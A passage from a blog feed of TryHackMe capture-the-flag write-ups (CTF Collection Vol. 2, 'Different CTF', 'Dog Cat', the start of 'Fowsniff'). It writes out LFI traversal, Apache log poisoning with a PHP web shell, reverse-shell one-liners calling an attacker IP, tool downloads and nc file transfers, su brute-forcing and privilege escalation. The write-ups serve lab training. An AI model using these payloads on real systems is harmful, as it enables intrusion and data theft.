Moreover, they are deterministic.\nSo, how do you get ALL the possible mappings? Its big brain time (for you. I did it already).\nPS: Feel free to use python3 again :) PPS: And what does mapping map to, in python lingo?\nEaster 16: Game 2 This one is very straight forward too, just use curl, and the -F flag to specify stuff. It stands for field.\nUse the below:\ncurl -X POST http://10.10.9.174/game2/ -F \u0026quot;button3=button3\u0026quot; -F \u0026quot;button2=button2\u0026quot; -F \u0026quot;button1=button1\u0026quot;\nEasy.\nEaster 17 \t\u0026lt;script\u0026gt; function catz(){ document.getElementById(\u0026quot;nyan\u0026quot;).innerHTML = \u0026quot;1000...\u0026quot; } \u0026lt;/script\u0026gt; Take the binary and then \u0026hellip; Binary -\u0026gt; Hex -\u0026gt; Text -\u0026gt; Stonks.\nEaster 18 The YES to say to the eggs one. curl -H \u0026quot;egg: YES\u0026quot; 10.10.9.174 | grep \u0026quot;Easter\u0026quot;\nEasy :)\nEaster 19 The thick dark line is an image. Check the source code :)\nEaster 20 \u0026lt;h3\u0026gt; Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.\u0026lt;/h3\u0026gt;\ncurl --data \u0026quot;username=DesKel\u0026amp;password=heIsDumb\u0026quot; -X POST 10.10.9.174 | grep \u0026quot;Easter 20\u0026quot;\nAnd \u0026hellip; we are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/nS97pns.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-ctf-collection-vol.-2-writeup/","title":"TryHackMe: CTF Collection Vol. 2 Writeup"},{"content":"Play\nNOTE: There is an issue in the machine sometimes. On a previous run, I got: nmap shows its a WordPress website, but \u0026hellip; we do not see anything here except the error.\nRedeploy the machine to fix the error. You may also see it later, and not immediately. Don\u0026rsquo;t panic, just reset.\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: WordPress 5.6 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Hello World \u0026amp;#8211; Just another WordPress site Service Info: OS: Unix Nothing special.\n1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -u adana.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q /wp-content (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/wp-content/] /wp-login.php (Status: 200) [Size: 6544] /license.txt (Status: 200) [Size: 19915] /announcements (Status: 301) [Size: 314] [--\u0026gt; http://adana.thm/announcements/] /wp-includes (Status: 301) [Size: 312] [--\u0026gt; http://adana.thm/wp-includes/] /javascript (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/javascript/] /readme.html (Status: 200) [Size: 7278] /wp-admin (Status: 301) [Size: 309] [--\u0026gt; http://adana.thm/wp-admin/] /phpmyadmin (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/phpmyadmin/] /xmlrpc.php (Status: 200) [Size: 0] /wp-signup.php (Status: 500) [Size: 2609] Take note of:\n announcements phpmyadmin  Rest looks generic WordPress stuff.\n1.3. Web Exploration Add the line 10.10.195.53 adana.thm in /etc/hosts. How do I know adana.thm is the domain name? Check the source code!\nInfo gathered:\n Standard WordPress website hakanbey01 is the only user, thus the admin  We find the \u0026ldquo;hidden directory\u0026rdquo;, 1.4. Steganography Interesting. Checking the strings and the binwalk commands showed nothing, however, steghide allows me to enter a passphrase.\n┌──(kali㉿kali)-[/tmp] └─$ steghide --extract --stegofile ant.jpg Enter passphrase: steghide: could not extract any data with that passphrase! Time to use stegseek!\nAgainst what list? The one given to us in the same directory :)\n┌──(kali㉿kali)-[/tmp] └─$ stegseek -wl wordlist.txt ant.jpg StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: \u0026quot;123adana{sorry, the rest was so tasty ... }\u0026quot; [i] Original filename: \u0026quot;user-pass-ftp.txt\u0026quot;. [i] Extracting to \u0026quot;ant.jpg.out\u0026quot;. ┌──(kali㉿kali)-[/tmp] └─$ cat ant.jpg.out RlRQLUxPR0{hidden ... } We decode this, which looks like a base64. It gives us FTP credentials! Also, quite interesting is the same prefix is used for both the passwords \u0026hellip;\n1.5 FTP Looking around, we get an interesting file, wp-config.php.\n\u0026lt;?php ... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'phpmyadmin1' ); /** MySQL database username */ define( 'DB_USER', '{I hid this ;) }' ); /** MySQL database password */ define( 'DB_PASSWORD', '{oooo noice}' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); ... Info gathered:\n Database name Database username Database password Database hostname  We have the database credentials \u0026hellip; how could we use them?\n1.6. phpMyAdmin Recall we saw /phpmyadmin/. Login with the database credentials we saw in the config.\nIf at this point, you see a bunch of errors, restart the machine. They should NOT happen, and the creds are correct.\nMake sure to re-edit your /etc/hosts file.\nWe are in!\nLet\u0026rsquo;s go to the database we saw eariler. In the wp_users tab, we see the username (which we saw earlier) and password hash!\n1.7. Hash Cracking Find the correct mode in hashcat, and we have:\n┌──(kali㉿kali)-[/tmp] └─$ hashcat -m {mode} hash.txt /usr/share/wordlists/rockyou.txt --quiet {hash}:{password :D } YES!\n1.8. WordPress Login Uh oh. Checking the wp-config again, we see:\n/** MySQL hostname */ define( 'DB_HOST', 'localhost' ); sneaky, don\u0026rsquo;t you think? Could be adana.thm \u0026hellip; or maybe it isn\u0026rsquo;t. Checking the wp_options tab on /phpmyadmin/, we get the subdomain :D\n1.9. WordPress Login in Subdomain Edit the line 10.10.190.211 adana.thm to 10.10.190.211 adana.thm subdomain.adana.thm.\nWe are in!\n2. Foothold I know of two ways we can get a shell:\n Appearance -\u0026gt; Theme Editor -\u0026gt; edit 404.php Plugins -\u0026gt; Add new -\u0026gt; Upload zip of phprevshell.  However, we see:\n      a permission error for both. If only there was a way we could edit the file permissions \u0026hellip;\n2.1. FTP (again) ftp\u0026gt; pwd 257 \u0026quot;/wp-content/themes/twentynineteen\u0026quot; is the current directory ftp\u0026gt; chmod 777 404.php 200 SITE CHMOD command ok. Upload a reverse shell using the route 1 mentioned above. Shell taken from Reverse Shell Generator.\n┌──(kali㉿kali)-[/tmp] └─$ nc -lnvp 443 listening on [any] 443 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.190.211] 43448 Linux ubuntu 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 04:31:28 up 23 min, 0 users, load average: 0.01, 0.02, 0.09 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can't access tty; job control turned off $ whoami www-data $ pwd / $ We are in the system!\n3. PrivEsc Now, let\u0026rsquo;s get linpeas to find priv esc vectors. Here\u0026rsquo;s the stuff it marked:\n[+] Unmounted file-system? [i] Check if you can mount umounted devices /dev/disk/by-id/dm-uuid-LVM-2vWU08UHAxgr0umysQPoxtHSdFdx70llz4fwL1Q9vtLr2IL1fPcyJc851c7izh0w / ext4 defaults 0 0 /dev/disk/by-uuid/069d6843-2a0d-4a97-b8cd-948aa75be772 /boot ext4 defaults 0 0 ^Nothing interesting\n[+] Processes with credentials in memory (root req) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory gdm-password Not Found gnome-keyring-daemon Not Found lightdm Not Found vsftpd process found (dump creds from memory as root) apache2 process found (dump creds from memory as root) sshd Not Found ^Nothing interesting\n[+] Checking sudo tokens [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens /proc/sys/kernel/yama/ptrace_scope is not enabled (1) gdb was found in PATH ^Interesting\n[+] Searching ssl/ssh files ListenAddress 127.0.0.1 PermitRootLogin no ChallengeResponseAuthentication no UsePAM yes Possible private SSH keys were found! /etc/ImageMagick-6/mime.xml --\u0026gt; /etc/hosts.allow file found, read the rules: /etc/hosts.allow ^False positive\n[+] Passwords inside pam.d /etc/pam.d/lightdm:auth sufficient pam_succeed_if.so user ingroup nopasswdlogin ^Useless (?)\n3.1. Sudo Token Vulnerability (Fail) Requirements to escalate privileges:\n You already have a shell as user \u0026ldquo;sampleuser\u0026rdquo; \u0026ldquo;sampleuser\u0026rdquo; have used sudo to execute something in the last 15mins (by default that\u0026rsquo;s the duration of the sudo token that allows to use sudo without introducing any password) cat /proc/sys/kernel/yama/ptrace_scope is 0 gdb is accessible (you can be able to upload it)   You can temporarily enable ptrace_scope with echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope or permanently modifying /etc/sysctl.d/10-ptrace.conf and setting kernel.yama.ptrace_scope = 0\n Source for the exploit\nBut I can\u0026rsquo;t edit ptrace_scope or check the point 2. Dead end.\n3.2. Lateral Escalation: Password Cracking Since we do not have ssh, we can try bruteforcing sudo su. We can use the wordlist we saw during steganography bruteforcing.\nDownload the sucrack files. .deb from here.\nTransfer this again.\nwww-data@ubuntu:/tmp$ wget 10.17.8.184/sucrack_1.2.3-4_amd64.deb wget 10.17.8.184/sucrack_1.2.3-4_amd64.deb --2021-06-03 05:01:53-- http://10.17.8.184/sucrack_1.2.3-4_amd64.deb Connecting to 10.17.8.184:80... connected. HTTP request sent, awaiting response... 200 OK Length: 16670 (16K) [application/vnd.debian.binary-package] Saving to: 'sucrack_1.2.3-4_amd64.deb' sucrack_1.2.3-4_amd 100%[===================\u0026gt;] 16.28K 74.2KB/s in 0.2s 2021-06-03 05:01:53 (74.2 KB/s) - 'sucrack_1.2.3-4_amd64.deb' saved [16670/16670] www-data@ubuntu:/tmp$ dpkg -x sucrack_1.2.3-4_amd64.deb sucrack dpkg -x sucrack_1.2.3-4_amd64.deb sucrack I tried with the wordlist we have aleady, but it was taking too long. According to THM Discord, it should not. Maybe I\u0026rsquo;m doing something wrong?\nI realised that 123adana is a prefix we saw for both the above passwords. Maybe the password is also starting from that? I looked it in the list and there was only one match. Did not work.\nHow about pre-pending 123adana to all the words?\nsed 's/^/123adana/' /tmp/wordlist.txt \u0026gt; newlist.txt\nAnd I tried it again \u0026hellip;\nAfter a long long time, I finally get\nwww-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt \u0026lt;k/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt password is: 123adanasubaru www-data@ubuntu:/tmp/sucrack/usr/bin$ su hakanbey Password: 123adana{mmm tasty} 3.3. Reverse Engineering: Binary hakanbey@ubuntu:~$ find / -type f -perm -u=s 2\u0026gt;/dev/null /bin/fusermount /bin/su /bin/umount /bin/mount /bin/ping /usr/local/bin/sudo /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/bin/chsh /usr/bin/arping /usr/bin/pkexec /usr/bin/traceroute6.iputils /usr/bin/passwd /usr/bin/gpasswd /usr/bin/sudo /usr/bin/chfn /usr/bin/binary /usr/bin/at /usr/bin/newgrp /usr/sbin/pppd /usr/sbin/exim4 /usr/bin/binary looks odd.\nhakanbey@ubuntu:~$ /usr/bin/binary I think you should enter the correct string here ==\u0026gt;hi pkill: killing pid 1545 failed: Operation not permitted pkill: killing pid 4209 failed: Operation not permitted pkill: killing pid 4412 failed: Operation not permitted pkill: killing pid 4414 failed: Operation not permitted ... Move binary to the place where we can get it from ftp :) hakanbey@ubuntu:/var/www/subdomain$ cp /usr/bin/binary .\nGive all the permissions: hakanbey@ubuntu:/var/www/subdomain$ chmod 777 binary \nGet the binary on your machine.\nftp\u0026gt; get binary local: binary remote: binary 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for binary (12984 bytes). 226 Transfer complete. 12984 bytes received in 0.00 secs (93.8069 MB/s) Doing strings on the binary, we get the following interesting information.\nI think you should enter the correct string here ==\u0026gt; /root/hint.txt Hint! : %s /root/root.jpg Unable to open source! /home/hakanbey/root.jpg Copy /root/root.jpg ==\u0026gt; /home/hakanbey/root.jpg Unable to copy! So we need something more, let\u0026rsquo;s do ltrace.\n┌──(kali㉿kali)-[/tmp] └─$ ltrace ./binary strcat(\u0026quot;war\u0026quot;, \u0026quot;zone\u0026quot;) = \u0026quot;warzone\u0026quot; strcat(\u0026quot;warzone\u0026quot;, \u0026quot;in\u0026quot;) = \u0026quot;warzonein\u0026quot; strcat(\u0026quot;warzonein\u0026quot;, \u0026quot;ada\u0026quot;) = \u0026quot;warzoneinada\u0026quot; strcat(\u0026quot;{woah is this it?}\u0026quot;, \u0026quot;na\u0026quot;) = \u0026quot;{very very nice}\u0026quot; printf(\u0026quot;I think you should enter the cor\u0026quot;...) = 52 __isoc99_scanf(0x55e7ade00edd, 0x7fff37c28a60, 0, 0I think you should enter the correct string here ==\u0026gt;warzoneinada ) = 1 strcmp(\u0026quot;{hidden}\u0026quot;, \u0026quot;{redacted}\u0026quot;) = -110 strcat(\u0026quot;pki\u0026quot;, \u0026quot;l\u0026quot;) = \u0026quot;pkil\u0026quot; strcat(\u0026quot;pkil\u0026quot;, \u0026quot;l\u0026quot;) = \u0026quot;pkill\u0026quot; strcat(\u0026quot;pkill\u0026quot;, \u0026quot; -9\u0026quot;) = \u0026quot;pkill -9\u0026quot; strcat(\u0026quot;pkill -9\u0026quot;, \u0026quot; -t\u0026quot;) = \u0026quot;pkill -9 -t\u0026quot; strcat(\u0026quot;pkill -9 -t\u0026quot;, \u0026quot; pts\u0026quot;) = \u0026quot;pkill -9 -t pts\u0026quot; strcat(\u0026quot;pkill -9 -t pts\u0026quot;, \u0026quot;/0\u0026quot;) = \u0026quot;pkill -9 -t pts/0\u0026quot; system(\u0026quot;pkill -9 -t pts/0\u0026quot; \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 +++ exited (status 0) +++ Putting in the last word works! Let\u0026rsquo;s do it on the target system.\nhakanbey@ubuntu:~$ ./usr/bin/binary ./usr/bin/binary bash: ./usr/bin/binary: No such file or directory hakanbey@ubuntu:~$ /usr/bin/binary /usr/bin/binary I think you should enter the correct string here ==\u0026gt;{yee haww} Hint! : Hexeditor 00000020 ==\u0026gt; ???? ==\u0026gt; /home/hakanbey/Desktop/root.jpg (CyberChef) Copy /root/root.jpg ==\u0026gt; /home/hakanbey/root.jpg hakanbey@ubuntu:~$ ls ls binary Documents Music Public Templates Videos Desktop Downloads Pictures root.jpg user.txt website hakanbey@ubuntu:~$ Okay \u0026hellip; time for image handling\n3.4. Image Handling Copy the image using netcat, on you machine. Follow the steps:\n Send the file to an IP with port specified.  hakanbey@ubuntu:~$ nc 10.17.8.184 3333 \u0026lt; root.jpg nc 10.17.8.184 3333 \u0026lt; root.jpg Listen and redirect.  ┌──(kali㉿kali)-[/tmp] └─$ nc -lnvp 3333 \u0026gt; img.jpg listening on [any] 3333 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.68.111] 35942 ^C Looking at the mentioned offset, we get: Using the hint from the room: From HEX, To Base85, I got the password :D\nroot@ubuntu:~# cat root.txt cat root.txt THM{wowowowowow} System compromised!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/uAE0SRq.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-different-ctf-writeup/","title":"TryHackMe: Different CTF Writeup"},{"content":"Play here\nRecon Exploring the website, we see that images come in the form of: http://10.10.13.155/cats/7.jpg\n❯ nmap -script=default -sV -A 10.10.13.155 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 23:30 EST Nmap scan report for 10.10.13.155 Host is up (0.23s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA) | 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA) |_ 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: dogcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.90 seconds We can access this :( http://10.10.13.155/cats/\nGobuster shows /cat.php and /dog.php; which shows random images of cats and dogs respectively. Okay. Wow what? There seems no other option than messing around with php stuff.\nThe room already gives us the hint of having LFI. Looking at OWASP LFI we get this http://vulnerable_host/preview.php?file=../../../../etc/passwd%00 giving us the exact path to the etc file, and we have a filter php://filter/convert.base64-encode/resource=FILE. As they metion in OWASP LFI,\n However, in some specific implementations this vulnerability can be used to upgrade the attack from LFI to Remote Code Execution vulnerabilities that could potentially fully compromise the host.\n  This enhancement is common when an attacker could be able to combine the LFI vulnerability with certain PHP wrappers.\n Sounds interesting. When we go to http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=dog we see \u0026lt;img src=\u0026quot;dogs/\u0026lt;?php echo rand(1, 10); ?\u0026gt;.jpg\u0026quot; /\u0026gt;. Exactly as we expected.\nHowever, going to http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd shows us\nNote how it wants us to only look at cats or dogs. I put in http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd to sneak, and it gives:\nSo now using that null byte, we get:\nNothing yet. So it\u0026rsquo;d now help to have a look at the index file itself.\n\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;dogcat\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;/style.css\u0026quot;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;dogcat\u0026lt;/h1\u0026gt; \u0026lt;i\u0026gt;a gallery of various dogs or cats\u0026lt;/i\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;What would you like to see?\u0026lt;/h2\u0026gt; \u0026lt;a href=\u0026quot;/?view=dog\u0026quot;\u0026gt;\u0026lt;button id=\u0026quot;dog\u0026quot;\u0026gt;A dog\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026quot;/?view=cat\u0026quot;\u0026gt;\u0026lt;button id=\u0026quot;cat\u0026quot;\u0026gt;A cat\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\u0026quot;ext\u0026quot;]) ? $_GET[\u0026quot;ext\u0026quot;] : '.php'; if(isset($_GET['view'])) { if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) { echo 'Here you go!'; include $_GET['view'] . $ext; } else { echo 'Sorry, only dogs or cats are allowed.'; } } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; This makes a lot of sense. We can see it always wants dog or cat included. It also has this parameter ext, which we can set or unset. This means the url must look like:\nhttp://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=dog../../../../../../etc/passwd\u0026amp;ext= This gives us the contents of the /etc/passwd file!\nLooking at the contents, we do not find anything out of the blue. What to do next? Well time for a reverse shell. The question is, how do we setup one?\nThe answer is using Apache Log Poisoning.\nhttp://10.10.152.133/?view=dog/../../../../../var/log/apache2/access.log\u0026amp;ext=\nThe below is what we find in the logs\n127.0.0.1 - - [04/Mar/2021:02:58:39 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:02:59:15 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:02:59:57 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:00:36 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:01:16 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:01:56 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 10.8.150.214 - - [04/Mar/2021:03:02:00 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 537 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026quot; 10.8.150.214 - - [04/Mar/2021:03:02:00 +0000] \u0026quot;GET /style.css HTTP/1.1\u0026quot; 200 698 \u0026quot;http://10.10.124.216/\u0026quot; \u0026quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026quot; 10.8.150.214 - - [04/Mar/2021:03:02:01 +0000] \u0026quot;GET /favicon.ico HTTP/1.1\u0026quot; 404 492 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026quot; 10.8.150.214 - - [04/Mar/2021:03:02:14 +0000] \u0026quot;GET /?view=dog/../../../../../var/log/apache2/access.log\u0026amp;ext= HTTP/1.1\u0026quot; 200 775 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:02:32 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:03:08 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:03:43 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:04:19 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:04:55 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; 127.0.0.1 - - [04/Mar/2021:03:05:26 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 615 \u0026quot;-\u0026quot; \u0026quot;curl/7.64.0\u0026quot; The below is what kind of user-requests looks like (I opened up burpsuite)\nGET /?view=dog/../../../../../var/log/apache2/access.log\u0026amp;ext= HTTP/1.1 Host: 10.10.124.216 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Lets put the ability to put commands as: `:\nThus, using it as:\nGET /?view=dog\u0026amp;c=php%20-r%20'$sock=fsockopen(%2210.8.150.214%22,4444);exec(%22/bin/sh%20-i%20%3C\u0026amp;3%20%3E\u0026amp;3%202%3E\u0026amp;3%22); HTTP/1.1 Host: 10.10.124.216 User-Agent: %3C?php%20system((isset($_GET%5B'c'%5D))?$_GET%5B'c'%5D:'echo');%20?%3E%0A Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 It does not work. So, I am going to try another route: upload the reverse shell php file (already present in kali systems) to the server using curl and the -A flag for setting the user agent. But thats not all, we need to have the file served, so that the curl command curls from our temporary server. I am going to use python3 simple http server for this.\n❯ sudo python3 -m http.server 4242 Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ... The curl did not work for some reason, so I fired up burp again, and this is what I put:\nGET /?view=dog../../../../../var/log/apache2/access.log\u0026amp;ext= HTTP/1.1 Host: 10.10.8.231 User-Agent: \u0026lt;?php file_put_contents('phpreverseshell.php',file_get_contents('http://10.8.150.214:4242/phpreverseshell.php'))?\u0026gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 I see get requests, so the payload was successful!\n❯ sudo python3 -m http.server 4242 Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ... 10.10.8.231 - - [03/Mar/2021 23:55:53] \u0026quot;GET /phpreverseshell.php HTTP/1.0\u0026quot; 200 - 10.10.8.231 - - [03/Mar/2021 23:56:21] \u0026quot;GET /phpreverseshell.php HTTP/1.0\u0026quot; 200 - Now, lets go to: http://10.10.8.231/phpreverseshell.php. And don\u0026rsquo;t forget to setup nc as well :P\nFoothold $ pwd / $ whoami www-data We are in!\n$ cat flag2_QMW7JvaY2LvK.txt THM{leet} $ pwd /var/www $ cat flag.php \u0026lt;?php $flag_1 = \u0026quot;THM{l33t}\u0026quot; ?\u0026gt; $ pwd /var/www/html Looking at the sudo permissions, we have:\n$ sudo -l Matching Defaults entries for www-data on f7c1f89308d0: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User www-data may run the following commands on f7c1f89308d0: (root) NOPASSWD: /usr/bin/env Interestingly, the machine name looks like a docker container. As for the permissions, gtfobins ftw. Anyways, after successful priv esc, we can get the third flag.\nLooking around, we see an interesting file in /opt/backup, which looks like our way out.\n# cat backup.sh #!/bin/bash tar cf /root/container/backup/backup.tar /root/container Let\u0026rsquo;s setup nc for a second time now, at another port\n❯ nc -lnvp 6969 listening on [any] 6969 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.8.231] 40614 bash: cannot set terminal process group (3450): Inappropriate ioctl for device bash: no job control in this shell root@dogcat:~# ls ls container flag4.txt root@dogcat:~# cat flag4.txt cat flag4.txt THM{PWNED} And we are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/nSkIlFr.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-dog-cat-vm-writeup/","title":"TryHackMe: Dog Cat VM Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA) | 256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA) |_ 256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Fowsniff Corp - Delivering Solutions 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: RESP-CODES TOP USER SASL(PLAIN) AUTH-RESP-CODE UIDL CAPA PIPELINING 143/tcp open imap Dovecot imapd |_imap-capabilities: AUTH=PLAINA0001 Pre-login LITERAL+ LOGIN-REFERRALS more have SASL-IR OK capabilities listed IDLE IMAP4rev1 ENABLE post-login ID Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Info gathered:\n SSH open port 80 serving http, we\u0026rsquo;ll explore it below POP3 port open, which means we are going to dig into employee e-mails XD  1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt,zip' -t 64 -q -u 10.10.115.96 /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.115.96/images/] /index.html (Status: 200) [Size: 2629] /security.txt (Status: 200) [Size: 459] /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.115.96/assets/] /README.txt (Status: 200) [Size: 1288] /robots.txt (Status: 200) [Size: 26] /LICENSE.txt (Status: 200) [Size: 17128] /server-status (Status: 403) [Size: 300] Info gathered:\n security.txt looks interesting robots.txt is usually very helpful /assets/ could contain shady javascript files  1.3. Web Exploration They mention some kind of breach, and something related to their official twitter account.\nLooking at the source code, we find a script commented out.\n\u0026lt;!--[if lte IE 8]\u0026gt;\u0026lt;script src=\u0026quot;assets/js/ie/respond.min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;![endif]--\u0026gt;\nThis may hint at something, and we may want to look at it later 